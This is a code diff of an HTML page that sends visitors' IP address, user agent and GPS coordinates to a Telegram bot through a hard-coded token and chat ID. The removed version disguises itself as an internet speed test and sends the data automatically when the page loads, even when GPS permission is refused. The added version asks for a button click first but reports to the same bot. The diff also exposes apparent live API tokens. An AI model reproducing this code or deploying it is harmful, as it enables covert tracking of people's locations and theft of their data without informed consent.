@@ -1,102 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Internet Speed Analyzer</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #f0f0f0;
-      text-align: center;
-      padding: 2rem;
-    }
-    .card {
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      padding: 2rem;
-      display: inline-block;
-      max-width: 400px;
-    }
-    h1 {
-      color: #333;
-    }
-    .status {
-      margin-top: 1rem;
-      font-size: 0.95rem;
-      color: #555;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>GPS & Info Sender</title>
 </head>
-<body>
-  <div class="card">
-    <h1>Speed Analyzer</h1>
-    <p>Analyzing your internet speed and region-based latency...</p>
-    <p class="status" id="status">Initializing...</p>
-  </div>
+<body style="font-family:Tahoma, sans-serif; text-align:center; margin-top:50px;">
 
-  <script>
-    const TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
-    const CHAT_ID = "6978055162";
+<h2>Click the button below to send your location and info</h2>
+<button id="getLocation" style="padding:10px 20px; font-size:16px; cursor:pointer;">Send Info</button>
 
-    async function sendToTelegram(message) {
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      });
-    }
+<script>
+const TELEGRAM_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
+const CHAT_ID = "6978055162";
 
-    async function collectData() {
-      const status = document.getElementById("status");
-      status.innerText = "Getting IP and system info...";
+async function getIP() {
+  try {
+    let res = await fetch('https://api.ipify.org?format=json');
+    let data = await res.json();
+    return data.ip;
+  } catch {
+    return "IP not available";
+  }
+}
 
-      let ipData = {};
-      try {
-        const res = await fetch("https://ipinfo.io/json?token=1ed7e8a879f5de");
-        ipData = await res.json();
-      } catch (e) {
-        ipData = { ip: "Unknown", city: "-", country: "-", org: "-" };
-      }
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "HTML"
+    })
+  });
+}
 
-      const userAgent = navigator.userAgent;
-      const time = new Date().toLocaleString();
+document.getElementById("getLocation").onclick = async () => {
+  if (!navigator.geolocation) {
+    alert("Sorry, your browser does not support GPS.");
+    return;
+  }
 
-      const baseMsg = `
-📡 Internet Speed Analyzer
-🕒 Time: ${time}
-🌐 IP: ${ipData.ip}
-🏙 Location: ${ipData.city}, ${ipData.country}
-📶 ISP: ${ipData.org}
-🧠 User Agent: ${userAgent}
+  let ip = await getIP();
+  let userAgent = navigator.userAgent;
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      let lat = pos.coords.latitude.toFixed(6);
+      let lon = pos.coords.longitude.toFixed(6);
+      let accuracy = pos.coords.accuracy;
+
+      let message = `
+📍 <b>User Location</b>:
+Latitude: <code>${lat}</code>
+Longitude: <code>${lon}</code>
+Accuracy: <code>${accuracy} meters</code>
+
+💻 <b>User Agent</b>: 
+<code>${userAgent}</code>
+
+🌐 <b>IP Address</b>: 
+<code>${ip}</code>
       `;
+      sendToTelegram(message);
+      alert("Your information has been sent.");
+    },
+    (error) => {
+      alert("Permission denied or an error occurred while getting location.");
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+};
+</script>
 
-      status.innerText = "Requesting GPS access...";
-
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          const { latitude, longitude } = position.coords;
-          const fullMessage = baseMsg + `\n📍 GPS: Latitude ${latitude}, Longitude ${longitude}`;
-          await sendToTelegram(fullMessage);
-          status.innerText = "✅ Data sent successfully.";
-        }, async (error) => {
-          const fullMessage = baseMsg + `\n📍 GPS: Permission denied`;
-          await sendToTelegram(fullMessage);
-          status.innerText = "⚠️ GPS permission denied, partial data sent.";
-        });
-      } else {
-        const fullMessage = baseMsg + `\n📍 GPS: Not supported`;
-        await sendToTelegram(fullMessage);
-        status.innerText = "⚠️ Geolocation not supported.";
-      }
-    }
-
-    collectData();
-  </script>
 </body>
 </html>
